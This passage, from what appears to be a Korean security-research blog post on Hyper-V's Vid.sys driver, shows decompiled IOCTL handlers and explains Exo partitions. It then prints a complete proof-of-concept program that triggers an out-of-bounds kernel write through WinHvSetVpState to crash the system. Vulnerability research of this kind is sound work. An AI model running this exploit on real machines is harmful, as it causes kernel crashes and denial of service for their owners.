        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0xc0000023&lt;/span&gt;;
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-number&#34;&gt;0x1fb000&lt;/span&gt; &amp;lt; OutputBufferLength) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x80000005&lt;/span&gt;;
      }
                    &lt;span class=&#34;hljs-comment&#34;&gt;/* WARNING: Load size is inaccurate */&lt;/span&gt;
      uVar2 = WinHvGetVpState(*(undefined8 *)(param_1[&lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;] + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;),*InputBuffer,
                              *(undefined *)((longlong)InputBuffer + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;),(longlong)InputBuffer + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;,
                              OutputBuffer,OutputBufferLength);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt; &amp;lt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)uVar2) {
        *param_9 = OutputBufferLength;
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar2;
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar2;
    &lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x221268&lt;/span&gt;:
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (InputBufferLength &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x21&lt;/span&gt;) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0xc0000023&lt;/span&gt;;
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-number&#34;&gt;0x1fb000&lt;/span&gt; &amp;lt; InputBufferLength - &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x80000005&lt;/span&gt;;
      }
                    &lt;span class=&#34;hljs-comment&#34;&gt;/* WARNING: Load size is inaccurate */&lt;/span&gt;
      uVar2 = WinHvSetVpState(*(undefined8 *)(param_1[&lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;] + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;),*InputBuffer,
                              *(undefined *)((longlong)InputBuffer + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;),(longlong)InputBuffer + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;,
                              (longlong)InputBuffer + &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;,InputBufferLength - &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar2;
	  ...
	}
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar2;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;control code&amp;#xAC00; &amp;#xAC01;&amp;#xAC01; 0x221264, 0x221268&amp;#xC77C; &amp;#xB54C; &lt;code&gt;WinHvGetVpState&lt;/code&gt;, &lt;code&gt;WinHvSetVpState&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC778; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;\Device\VidExo&lt;/code&gt; &amp;#xB514;&amp;#xBC14;&amp;#xC774;&amp;#xC2A4;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; I/O Control&amp;#xC740; &lt;code&gt;VidExopIoControlPreProcess&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xB85C; &amp;#xC774;&amp;#xC5B4;&amp;#xC838; &lt;code&gt;VidExoIoControlDriver&lt;/code&gt;, &lt;code&gt;VidExoIoControlPartition&lt;/code&gt;, &lt;code&gt;VidIoControlDriver&lt;/code&gt;, &lt;code&gt;VidIoControlPartition&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xC911; &amp;#xD558;&amp;#xB098;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image7.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image7.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;VidExopIoControlPreProcess&#34;&gt;&lt;a href=&#34;#VidExopIoControlPreProcess&#34; class=&#34;headerlink&#34; title=&#34;VidExopIoControlPreProcess&#34;&gt;&lt;/a&gt;&lt;code&gt;VidExopIoControlPreProcess&lt;/code&gt;&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;__int64 __fastcall &lt;span class=&#34;hljs-title&#34;&gt;VidExopIoControlPreProcess&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(__int64 a1, IRP *irp)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  a8[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  CurStackLocation = irp-&amp;gt;Tail.Overlay.CurrentStackLocation;
  CTL_CODE = CurStackLocation-&amp;gt;Parameters.DeviceIoControl.IoControlCode;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (CTL_CODE &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
  {
    InputLength = CurStackLocation-&amp;gt;Parameters.DeviceIoControl.InputBufferLength;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( InputLength )
      InputBuffer = irp-&amp;gt;AssociatedIrp.SystemBuffer;
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
      InputBuffer = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
    OutputLength = CurStackLocation-&amp;gt;Parameters.DeviceIoControl.OutputBufferLength;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( OutputLength )
      OutputBuffer = irp-&amp;gt;AssociatedIrp.SystemBuffer;
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
      OutputBuffer = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
    FileObj = CurStackLocation-&amp;gt;FileObject;
    v11 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64)FileObj-&amp;gt;FsContext;
    fscontext = v11 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFFFFFFFFFC&lt;/span&gt;ui64;&lt;span class=&#34;hljs-comment&#34;&gt;// *(DWORD*)fscontext == &amp;apos; oxE&amp;apos;&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( fscontext )
    {
      if ( *(_DWORD *)fscontext != &amp;apos; oxE&amp;apos; )
      {
        if ( *(_DWORD *)fscontext != &amp;apos;ntrP&amp;apos; )
        {
          v5 = &lt;span class=&#34;hljs-number&#34;&gt;-1073741816&lt;/span&gt;;
          &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_3;
        }
        ...
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( _bittest64(&amp;amp;v16, &lt;span class=&#34;hljs-number&#34;&gt;0xF&lt;/span&gt;u) )
          v17 = VidExoIoControlPartition((_QWORD *)fscontext,irp,FileObj,InputBuffer,InputLength,OutputBuffer,OutputLength,CTL_CODE,(__int64)a8);
        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
          ...
      }
      v20 = VidExoIoControlDriver(v13, v12, InputBuffer, InputLength, OutputBuffer, OutputLength, CTL_CODE, a8);
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      v20 = VidIoControlDriver((__int64)VidDeviceExtension,(__int64)FileObj,InputBuffer,InputLength,OutputBuffer,OutputLength,CTL_CODE,a8);
    }
   ...
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; v5;
}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;Exo-Partition&#34;&gt;&lt;a href=&#34;#Exo-Partition&#34; class=&#34;headerlink&#34; title=&#34;Exo Partition&#34;&gt;&lt;/a&gt;Exo Partition&lt;/h2&gt;&lt;p&gt;&amp;#xBC14;&amp;#xB85C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xB7EC; &amp;#xAC00;&amp;#xBCF4;&amp;#xAE30; &amp;#xC804;&amp;#xC5D0; Exo Partition&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC54C; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB514;&amp;#xBC14;&amp;#xC774;&amp;#xC2A4; &amp;#xC774;&amp;#xB984;&amp;#xC774;&amp;#xB098; &amp;#xD568;&amp;#xC218;&amp;#xBA85;&amp;#xC5D0;&amp;#xC11C; &amp;#xACC4;&amp;#xC18D; &amp;#xBCF4;&amp;#xC774;&amp;#xB294; &lt;code&gt;Exo&lt;/code&gt;&amp;#xB77C;&amp;#xB294; &amp;#xB2E8;&amp;#xC5B4;&amp;#xB294; &amp;#xD574;&amp;#xB2F9; &amp;#xB514;&amp;#xBC14;&amp;#xC774;&amp;#xC2A4;&amp;#xC640; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC774; Exo Partition&amp;#xACFC; &amp;#xC5F0;&amp;#xAD00;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC778;&amp;#xB370;&amp;#xC694;? &amp;#xC774; Exo Partition&amp;#xC774;&amp;#xB77C;&amp;#xB294; &amp;#xAC74; &amp;#xD55C;&amp;#xB9C8;&amp;#xB514;&amp;#xB85C; WHVP(Windows Hypervisor Platform) API&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xAD00;&amp;#xB9AC;&amp;#xB418;&amp;#xB294; &amp;#xD30C;&amp;#xD2F0;&amp;#xC158;&amp;#xC744; &amp;#xB9D0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;! WHVP API&amp;#xAC00; &amp;#xC81C;&amp;#xACF5;&amp;#xD558;&amp;#xB294; &lt;code&gt;WHvCreatePartition&lt;/code&gt;, &lt;code&gt;WHvCreateVirtualProcessor&lt;/code&gt; &amp;#xB4F1;&amp;#xC758; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xBA74; Hyper-V&amp;#xC758; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD30C;&amp;#xD2F0;&amp;#xC158;/&amp;#xAC00;&amp;#xC0C1; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC11C;&amp;#xC758; &amp;#xC0DD;&amp;#xC131;&amp;#xACFC; &amp;#xAD00;&amp;#xB9AC; &amp;#xB4F1;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; WHVP API&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; Partition &amp;#xC0DD;&amp;#xC131;/&amp;#xC81C;&amp;#xAC70;&amp;#xB97C; &amp;#xD558;&amp;#xB294; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC608;&amp;#xC2DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;WinHvPlatform.h&amp;quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;
main()
{
	WHV_PARTITION_HANDLE prtn;
	WHV_CAPABILITY cap;
	&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; size, val;
	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* payload = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;

	WHvGetCapability(WHvCapabilityCodeHypervisorPresent, &amp;amp;cap, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(cap), &amp;amp;size);

	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (cap.HypervisorPresent == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
	{
		&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hypervisor is not present\n&amp;quot;&lt;/span&gt;);
		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt;;
	}

	WHvCreatePartition(&amp;amp;prtn);

	val = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//processor cnt&lt;/span&gt;
	WHvSetPartitionProperty(prtn, WHvPartitionPropertyCodeProcessorCount, &amp;amp;val, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(val));

	WHvSetupPartition(prtn);

	WHvDeletePartition(prtn);
}&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;Exploitation-Denial-of-Service&#34;&gt;&lt;a href=&#34;#Exploitation-Denial-of-Service&#34; class=&#34;headerlink&#34; title=&#34;Exploitation - Denial of Service&#34;&gt;&lt;/a&gt;Exploitation - Denial of Service&lt;/h1&gt;&lt;p&gt;&amp;#xB2E4;&amp;#xC2DC; &amp;#xBCF8;&amp;#xB860;&amp;#xC73C;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC640;&amp;#xC11C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;WinHvSetVpState&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; OOB Write&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xCEE4;&amp;#xB110; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB4E4;&amp;#xC744; &amp;#xC624;&amp;#xC5FC;&amp;#xC2DC;&amp;#xCF1C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0A4;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; Denial of Service&amp;#xB97C; &amp;#xB2EC;&amp;#xC131;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;WinHvPlatform.h&amp;quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; OOB_WRITE_CTL_CODE 0x221268&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; OOB_SIZE 0x10000&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;
main()
{
	WHV_PARTITION_HANDLE prtn;
	WHV_CAPABILITY cap;
	&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; size, val;
	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* payload = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;

	WHvGetCapability(WHvCapabilityCodeHypervisorPresent, &amp;amp;cap, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(cap), &amp;amp;size);

	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (cap.HypervisorPresent == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
	{
		&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hypervisor is not present\n&amp;quot;&lt;/span&gt;);
		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt;;
	}

	WHvCreatePartition(&amp;amp;prtn);

	val = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//processor cnt&lt;/span&gt;
	WHvSetPartitionProperty(prtn, WHvPartitionPropertyCodeProcessorCount, &amp;amp;val, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(val));

	WHvSetupPartition(prtn);

	HANDLE VidExo = (HANDLE)(*((__int64*)prtn + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xfffffffffffffffe&lt;/span&gt;);

	payload = &lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(OOB_SIZE);
	&lt;span class=&#34;hljs-built_in&#34;&gt;memset&lt;/span&gt;(payload, &lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;, OOB_SIZE);

	&lt;span class=&#34;hljs-comment&#34;&gt;//exploit&lt;/span&gt;
	DeviceIoControl(VidExo, OOB_WRITE_CTL_CODE, payload, OOB_SIZE, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;);

	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%p\n&amp;quot;&lt;/span&gt;, VidExo);

	getc(&lt;span class=&#34;hljs-built_in&#34;&gt;stdin&lt;/span&gt;);

	WHvDeletePartition(prtn);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCF4;&amp;#xC2DC;&amp;#xBA74; &lt;code&gt;CreateFileA&lt;/code&gt;&amp;#xB098; &lt;code&gt;CreateFileW&lt;/code&gt;&amp;#xB85C; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &lt;code&gt;\Device\VidExo&lt;/code&gt;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xD578;&amp;#xB4E4;&amp;#xC744; &amp;#xC5BB;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC544;&amp;#xB2CC; WHVP API&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xC0DD;&amp;#xC131;&amp;#xD55C; &amp;#xD30C;&amp;#xD2F0;&amp;#xC158;&amp;#xC758; &amp;#xD578;&amp;#xB4E4;&amp;#xC744; &amp;#xCC38;&amp;#xC870;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;VidExo&lt;/code&gt;&amp;#xC758; &amp;#xD578;&amp;#xB4E4;&amp;#xC744; &amp;#xAC00;&amp;#xC838;&amp;#xC624;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;? &lt;code&gt;\Device\VidExo&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xC774; &amp;#xBD88;&amp;#xAC00;&amp;#xB2A5;&amp;#xD55C; &amp;#xAC83;&amp;#xC740; &amp;#xC544;&amp;#xB2C8;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778; &lt;code&gt;CreateFile&lt;/code&gt;&amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xB85C; &amp;#xC5BB;&amp;#xC5B4;&amp;#xC9C0;&amp;#xB294; &lt;code&gt;VidExo&lt;/code&gt;&amp;#xC758; &amp;#xD578;&amp;#xB4E4;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C; &lt;code&gt;DeviceIoControl&lt;/code&gt;&amp;#xB294; &lt;code&gt;WinHvGet/SetVpState&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;CreateFile&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD574;&amp;#xC11C; &lt;code&gt;VidExo&lt;/code&gt;&amp;#xC758; &amp;#xD578;&amp;#xB4E4;&amp;#xC774; &amp;#xC0DD;&amp;#xC131;&amp;#xB420; &amp;#xB54C; &lt;code&gt;Vid.sys&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;VidExo&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xAC00; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4;&amp;#xC9C0;&amp;#xACE0; &amp;#xC774; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;Exo&lt;/code&gt;&amp;#xC640; &lt;code&gt;Prtn&lt;/code&gt; &amp;#xD0C0;&amp;#xC785;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;VidExopIoControlPreProcess&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;fscontext&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xC2DC;&amp;#xADF8;&amp;#xB2C8;&amp;#xCC98;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;VidExo&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xAC00; &amp;#xC5B4;&amp;#xB5A4; &amp;#xD0C0;&amp;#xC785;&amp;#xC778;&amp;#xC9C0; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;...
 fscontext = v11 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFFFFFFFFFC&lt;/span&gt;ui64;&lt;span class=&#34;hljs-comment&#34;&gt;// *(DWORD*)fscontext == &amp;apos; oxE&amp;apos;&lt;/span&gt;
 &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( fscontext )
 {
   if ( *(_DWORD *)fscontext != &amp;apos; oxE&amp;apos; )
   {
     if ( *(_DWORD *)fscontext != &amp;apos;ntrP&amp;apos; )
 ...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;WinHvGet/SetVpState&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &lt;code&gt;VidExoIoControlPartition&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB294; &lt;code&gt;VidExo&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xAC00; &lt;code&gt;Prtn&lt;/code&gt; &amp;#xD0C0;&amp;#xC785;&amp;#xC778; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778; &lt;code&gt;CreateFile&lt;/code&gt;&amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xB85C; &amp;#xC5BB;&amp;#xC5B4;&amp;#xC9C4; &lt;code&gt;\Device\VidExo&lt;/code&gt; &amp;#xD578;&amp;#xB4E4;&amp;#xC740; &lt;code&gt;Exo&lt;/code&gt; &amp;#xD0C0;&amp;#xC785;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &amp;#xAC70;&amp;#xC8E0;&amp;#x2026;&lt;/p&gt;
